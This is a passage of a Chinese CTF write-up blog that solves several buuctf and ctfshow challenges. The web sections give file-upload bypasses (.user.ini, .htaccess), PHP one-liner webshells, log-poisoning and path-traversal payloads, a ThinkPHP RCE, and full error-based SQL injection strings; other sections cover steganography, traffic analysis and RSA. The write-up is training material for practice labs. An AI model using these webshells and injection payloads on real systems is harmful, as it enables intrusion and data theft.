src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812092335.png"></p><p>得到flag</p><p>或者在登录框注入一样可以得到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812092632.png"></p></li></ul><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p><strong>来源：</strong>buuctf</p><p><strong>考察知识点：</strong>文件上传绕过</p><h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先肯定是考察文件上传，尝试几种常用的文件上传绕过，发现并不可行，了解到有user.ini这个文件类型可以绕过</p><h2 id="解题步骤-6"><a href="#解题步骤-6" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>尝试了几种常用的绕过方式无果，这里了解到了user.ini绕过</p><p>php.ini是php默认的配置文件，其中包括了很多php的配置</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812094537.png"></p><p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.</p></li></ul><ul><li><p>制作.user.ini文件</p><p><code>GIF89a auto_prepend_file=gif.gif</code> gif.gif则为需要包含的文件</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812095141.png"></p><p><strong>可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</strong></p></li><li><p>进行上传，先上传一个.user.ini后缀的文件</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812095231.png"></p><p>成功返回路径</p></li><li><p>再上传一个带有一句话木马的图片文件（这里不能上传php代码的图片文件，后端进行了内容检测，我们上传一个js的即可）</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812095438.png"></p><p>​    上传成功</p><ul><li><p>蚁剑连接得到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812102449.png"></p></li></ul><h1 id="题目：-极客大挑战2019-Knife"><a href="#题目：-极客大挑战2019-Knife" class="headerlink" title="题目：[极客大挑战2019]Knife"></a>题目：[极客大挑战2019]Knife</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>蚁剑的使用</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dbce59b18.jpg"></p><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>做web题首先打开源码看一下，然后根据题目名称和页面的提示，看到eval($_POST[“Syc”])，可以猜到应该就是通过一句话木马，我们通过蚁剑或者菜刀链接，来拿到shell，拿到flag</p><h2 id="解题步骤-7"><a href="#解题步骤-7" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>首先查看源码，看了一圈没什么异常</p></li><li><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dc69b5633.jpg"></p></li><li><p>通过题目和菜刀很容易想到通过蚁剑或是菜刀连接后台</p></li><li><p>这里我们用到蚁剑来连接，打开后右键添加数据，然后填上url，密码为Syc，因为他给了我们上传的一句话木马：<code>eval($_POST[&quot;Syc&quot;]);</code> 是post Syc</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dcea86ce8.jpg"></p><ul><li><p>可以看到连接成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dd729ceb1.jpg"></p></li><li><p>然后我们打开终端，然后cd到根目录下，通过命令 cat flag，即可看到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f3dde47e3e7.jpg"></p></li></ul><h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p><strong>来源：</strong>攻防世界</p><p><strong>涉及知识点：</strong>命令执行</p><h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>这是think php的框架，这个版本的有漏洞可以利用，网上都有poc，可以利用把poc改一改即可得到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812103915.png"></p><h2 id="解题步骤-8"><a href="#解题步骤-8" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>因为是框架类题目，一般都是有漏洞可以利用，从github上查找</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812104022.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812104058.png"></p></li></ul><ul><li><p>找到poc输入url</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812104200.png"></p><p>返回了几个用户组，这说明漏洞可以利用</p></li></ul><ul><li>将poc改一改，将id改为ls，查看目录</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812104248.png"></p><p>​    没有直接的flag.php，那么我们通过目录穿越的方式查找</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812104403.png"></p><p>​    找到flag，进行读取即可</p><ul><li><code>cat%20../../../flag</code> 得到flag</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812104632.png"></p><h1 id="1024-WEB签到"><a href="#1024-WEB签到" class="headerlink" title="1024_WEB签到"></a>1024_WEB签到</h1><p><strong>来源：</strong>ctfshow 1024杯</p><p><strong>涉及知识点：</strong>代码审计，</p><h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先阅读php代码，查看有无附加信息，因为是签到题，应该不会很难，根据传参找到phpinfo界面，查找想要的即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812105156.png"></p><h2 id="解题步骤-9"><a href="#解题步骤-9" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>阅读代码可知，需要get一个值</p><p>因为只有一个传参位置，这里只能调用无需传参的函数</p><p>这里传一个phpinfo查看信息</p></li></ul><ul><li><p>访问它</p><p>![image-20210812105359158](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210812105359158.png)</p></li><li><p>找到有效信息</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812105425.png"></p><p>定义了一个函数，那么我们将f的值赋给这个函数即可得到flag</p></li></ul><ul><li><p>payload：<code>?f=ctfshow_1024</code></p><p>得到flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812105554.png"></p></li></ul><h1 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h1><p><strong>来源：</strong>ctfshow ak赛</p><p><strong>涉及知识点：</strong>php伪协议，日志注入</p><h2 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h2><p>给出源代码，看到file猜测是文件包含类型题目，用目录穿越的方式试试看，可不可行，后来发现是可以使用日志注入的，通过抓包改包，写入一句话木马，用蚁剑连接即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812110418.png"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul><li><p>payload：<code>?file=../../../../../etc/passwd</code>查看是否存在文件包含漏洞</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812110550.png"></p></li><li><p>使用远程文件包含无果，尝试日志注入<br>访问 /var/log/nginx/access.log</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812110706.png"></p><p>可查看日志，也就是说我们可以利用日志写入一句话木马，进行抓包</p></li></ul><ul><li><p>改包，添加一句话木马，我们在UA这里更改即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812110902.png"></p></li></ul><ul><li><p>使用蚁剑连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812111330.png"></p></li></ul><p>得到flag</p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p><strong>来源：</strong>buuctf</p><p><strong>涉及知识点：</strong>sql注入，报错注入</p><h2 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先判断是否有过滤，并想方法绕过，发现能用的查询语句被ban了，猜测是否是时间盲注或者报错注入，发现报错注入能注出数据库来，如果遇到被过滤的函数，那么选择绕过即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812150808.png"></p><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ul><li><p>首先使用order by判断列数</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812151012.png"></p><p>这种显示大概率是函数名被ban了，经过测试，union也被ban了</p><p>![image-20210812151436680](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210812151436680.png)</p><p>and也被ban了</p></li><li><p>尝试使用报错注入</p><p>payload：<code>1&#39;^extractvalue(1,concat(0x23,database(),0x23))#</code></p><p>或者 <code>1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812151855.png"></p><p>​    得到数据库名</p><ul><li><p>获取表名，常规语句为 <code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code> 但这里空格过滤，需要将他们转化为括号绕过</p><p>同样等号也被ban了，网上搜索了一下，可以用like绕过</p><p>最终payload:<code>?username=d&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812152719.png"></p><p>得到表名</p></li><li><p>获取字段，语句很简单，再原语句修改即可</p><p>payload：<code>?username=d&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812152934.png"></p><ul><li><p>获取字段值，常规的查询语句</p><p>payload：<code>?username=d&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(password)from(geek.H4rDsq1)),0x7e),1))%23</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812153128.png"></p><p>​    获得半个flag，看了wp才知道有一个骚操作 {left(),right()}，这样可以把左边和右边的都显示出来</p><ul><li>payload前面：<code>?username=d&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1)),0x7e),1))%23</code></li><li>payload后面：<code>?username=d&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23</code></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210812153454.png"></p><p>​    拼接即可得到完整flag</p><h1 id="题目：被嗅探的流量"><a href="#题目：被嗅探的流量" class="headerlink" title="题目：被嗅探的流量"></a>题目：被嗅探的流量</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>流量分析</p><h2 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h2><p>首先常规先导出http流量看看，结果一下就出flag了</p><h2 id="解题步骤-10"><a href="#解题步骤-10" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li>观察流量包，发现有一处为图片</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726151445.png"></p><ul><li><p>追踪http流，分析一波流量</p><p>![image-20210726151646240](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210726151646240.png)</p></li><li><p>发现在图片尾有flag，得到flag</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726152510.png"></p><h1 id="题目：-SWPU2019-我有一只马里奥"><a href="#题目：-SWPU2019-我有一只马里奥" class="headerlink" title="题目： [SWPU2019]我有一只马里奥"></a>题目： [SWPU2019]我有一只马里奥</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>ntfs流隐写(因为接触到不多，所以多写写)</p><h2 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h2><p>下载附件，得到一个exe文件，那就先运行一下吧，得到一个txt，根据提示可知道是ntfs文件流隐写，所以丢到ntfs工具中进行解密即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726215122.png"></p><h2 id="解题步骤-11"><a href="#解题步骤-11" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>运行exe文件得到txt文件，内容如下：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726215343.png"></p></li><li><p>提示ntfs，拿出我们的老工具，然后将txt丢进去，注意！一定要将txt包上文件夹再用ntfs</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726215417.png"></p></li><li><p>将结果导出，即可得到flag：swupctf{ddg_is_cute}</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726215538.png"></p></li></ul><h1 id="题目：喵喵喵"><a href="#题目：喵喵喵" class="headerlink" title="题目：喵喵喵"></a>题目：喵喵喵</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>lsb隐写，长宽高隐写</p><h2 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h2><p>下载后为一张图片，先常规三件套，看看是否有隐藏信息，隐藏文件等，没有，则打开</p><p>stegsolve看看rgb通道，是否为lsb隐写，之后再用010调整高度即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726184509.png"></p><h2 id="解题步骤-12"><a href="#解题步骤-12" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li>在010中打开，看看是否有附加信息</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726184543.png"></p><p>并无果，尝试分离也无果</p><ul><li><p>用stegsolve打开，查看各通道</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726184626.png"></p></li><li><p>如上图发现在0通道时有点东西，猜测是lsb隐写，于是我们将RGB通道调为0</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726184833.png"></p><ul><li><p>如上图，可以很明显的看见是一张图片，我们导出并查看，可以看到文件头并不是正常的png文件头</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726185059.png"></p></li><li><p>将FF FE去除后即可正常显示图片</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726185205.png"></p></li><li><p>接下来就很简单了，应该就是改一改宽高的事情</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726185315.png"></p></li><li><p>扫码得到一个zip，里面txt内容为</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726185848.png"></p></li><li><p>啊这，难题了，不会了，上网搜了一下，是NTFS文件流隐写，将flag.txt解压到一个新建的文件夹内，然后打开<strong>ntfsstreamseditor.exe</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726193732.png"></p></li><li><p>看到后缀为.pyc，是使用在线网站进行反编译 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726193841.png"></p><ul><li><p>网上找了个脚本解密</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726193951.png"></p></li></ul><p>得到 flag{Y@e_Cl3veR_C1Ever!}</p><h1 id="题目：刷新过的图片"><a href="#题目：刷新过的图片" class="headerlink" title="题目：刷新过的图片"></a>题目：刷新过的图片</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>F5隐写</p><h2 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h2><p>根据题目很容易就知道了是F5隐写，在kali中下载工具即可</p><p>下载方法：<code>git clone https://github.com/matthewgao/F5-steganography</code></p><p>F5-steganography</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726211708.png"></p><h2 id="解题步骤-13"><a href="#解题步骤-13" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>在kali中打开这张照片 </p></li><li><p>在F5-steganography文件夹下使用命令<code>java Extract f5.jpg</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726213047.png"></p></li><li><p>打开output.txt，解密结果已在txt中</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726213115.png"></p></li><li><p>是一个压缩包格式，将txt后缀改为zip即可，打开如下</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726213617.png"></p><ul><li><p>首先判断是否为<strong>伪加密</strong>，因为没有其他附加的信息可以利用了</p><p>ps:这里很奇怪不知道010为什么改不了伪加密，显示只读，用winhex打开后发现可以更改 惊！</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726214335.png"></p><ul><li><p>得到 flag{96efd0a2037d06f34199e921079778ee}</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726214442.png"></p></li></ul><h1 id="题目：-GUET-CTF2019-BabyRSA"><a href="#题目：-GUET-CTF2019-BabyRSA" class="headerlink" title="题目：[GUET-CTF2019]BabyRSA"></a>题目：[GUET-CTF2019]BabyRSA</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>lsb隐写，长宽高隐写</p><h2 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h2><p>首先观察所给条件，观察题目和类型，进行题目类型的搜索，根据已知查找脚本</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724214223.png"></p><h2 id="解题步骤-14"><a href="#解题步骤-14" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li><p>观察题目给的条件，给了p+q，（p+1)(q+1)，e，d,以及密文C.<br>RSA的解密公式：M=C^d mod n<br>所以我们只要求出n即可。(n = pq)<br>n = (p+1)(q+1) - (p+q) - 1<br>即可解出明文m</p></li><li><p>脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">b = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">c= <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = b-a-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))  <span class="comment">#（n2s将数值转化为字符串）</span></span><br></pre></td></tr></table></figure><ul><li>如下图</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724214454.png"></p><p>即可得到 flag{cc7490e-78ab-11e9-b422-8ba97e5da1fd}</p><h1 id="题目：-GXYCTF2019-BabyUpload"><a href="#题目：-GXYCTF2019-BabyUpload" class="headerlink" title="题目：[GXYCTF2019]BabyUpload"></a>题目：[GXYCTF2019]BabyUpload</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>文件上传</p><h2 id="解题思路：-4"><a href="#解题思路：-4" class="headerlink" title="解题思路："></a>解题思路：</h2><p>文件上传类型题目，先探索能上传文件格式有哪些，然后burp抓个包，看看有无过滤，再根据过滤的进行选择绕过姿势，并通过蚁剑连接，获得flag</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726172232.png"></p><h2 id="解题步骤-15"><a href="#解题步骤-15" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li>先随便上传一些试试，上传了gif显示如下，应该是不让上传的</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726173608.png"></p><ul><li><p>最常规的上传，改后缀试试看呢，并不太行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726174028.png"></p></li><li><p>尝试上传.htaccess文件，如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726174120.png"></p></li><li><p>居然成功了？！ 那么接下来就很简单了，我们将带有一句话木马的jpg文件上传即可被htaccess解析为php文件，即可成功上传</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726174306.png"></p></li><li><p>上传jpeg格式的文件即可，但这里还有个问题，通过<strong>源码</strong>我们可以看到有一个过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&lt;\?/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;诶，别蒙我啊，这标志明显还是php啊&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>也就是不允许一句话木马为php的，那么我们用js代码写一句话即可</p><p>以下是内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;shell&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>进行上传，如下图成功上传，不出意料应该是可以通过蚁剑连接的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726174848.png"></p></li><li><p>试试连接蚁剑，url为上传文件的地址，密码为shell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726172002.png"></p></li><li><p>即可看到成功连接，进入权限，接下来就是寻找flag在哪里了，可以在根目录下找到</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726172050.png"></p><ul><li>根目录下即可得到flag  flag{629fe594-cc3d-48d0-aed3-3fbc01899ffd}</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726171810.png"></p><h1 id="题目：-GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#题目：-GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="题目：[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>题目：[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h1><p><strong>来源：</strong>buuctf</p><p><strong>本题涉及知识点：</strong>base64隐写</p><h2 id="解题思路：-5"><a href="#解题思路：-5" class="headerlink" title="解题思路："></a>解题思路：</h2><p>先看题目，base64解密一下，并没有什么有效的信息，尝试一下常规的编码试试，但并不能出什么有线索的，查找资料后得知可能是base64隐写，于是找个脚本跑一下即可</p><h2 id="解题步骤-16"><a href="#解题步骤-16" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul><li>先将题目base64解密一下，并没有发现什么有线索的</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f58d28f2379.jpg"></p><ul><li><p>将txt中类似base64的解密后得到</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f58e36681ef.jpg"></p><p>Cette nuit,</p><p>Intenable insomnie,</p><p>La folie me guette,</p><p>Je suis ce que je fuis</p><p>Je subis,</p><p>Cette cacophonie,</p><p>Qui me scie la t锚te,</p><p>Assommante harmonie,</p><p>Elle me dit,</p><p>Tu paieras tes delits,</p><p>Quoi qu‘il advienne,</p></li></ul><p>​    网上搜了一下这是杀人狂想曲的歌词，但又不完全一样，考虑是base64隐写，使一些编码显示异常，于是查找base64隐写脚本，梭一下便出来了</p><ul><li>脚本如下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">base64 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">path = <span class="built_in">input</span>(<span class="string">&quot;按回车进行操作&quot;</span>)   <span class="comment">#读取文件的位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">string_test</span>) :</span></span><br><span class="line">    strings_ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> every <span class="keyword">in</span> string_test :</span><br><span class="line">        bin_num = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> every == <span class="string">&quot;=&quot;</span> :</span><br><span class="line">            <span class="keyword">return</span> strings_ans</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            num = base64.find(every)</span><br><span class="line">            <span class="keyword">while</span> num != <span class="number">0</span> :</span><br><span class="line">                bin_num += <span class="built_in">str</span>(num%<span class="number">2</span>)</span><br><span class="line">                num = <span class="built_in">int</span>(num/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(bin_num) &lt;<span class="number">6</span> :</span><br><span class="line">                bin_num += <span class="string">&quot;0&quot;</span></span><br><span class="line">            bin_num = bin_num[::-<span class="number">1</span>]</span><br><span class="line">        strings_ans += bin_num</span><br><span class="line">    <span class="keyword">return</span> strings_ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span>(<span class="params">strings_last</span>) :</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    strings_temp = change(strings_last)</span><br><span class="line">    <span class="keyword">if</span> strings_last.count(<span class="string">&#x27;=&#x27;</span>) == <span class="number">1</span> :</span><br><span class="line">        ans += strings_temp[-<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        ans += strings_temp[-<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> in_file :   <span class="comment">#输入文件的名称</span></span><br><span class="line">    strings_first = in_file.readlines()</span><br><span class="line">    strings = []</span><br><span class="line">    <span class="keyword">for</span> every_strings <span class="keyword">in</span> strings_first :</span><br><span class="line">        <span class="keyword">if</span> every_strings[-<span class="number">2</span>] ==<span class="string">&quot;=&quot;</span> :</span><br><span class="line">            strings.append(every_strings)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out_file :    <span class="comment">#输出文件的名称</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> strings :</span><br><span class="line">        ans += answer(line)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    list_num = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ans)) :</span><br><span class="line">        num = num*<span 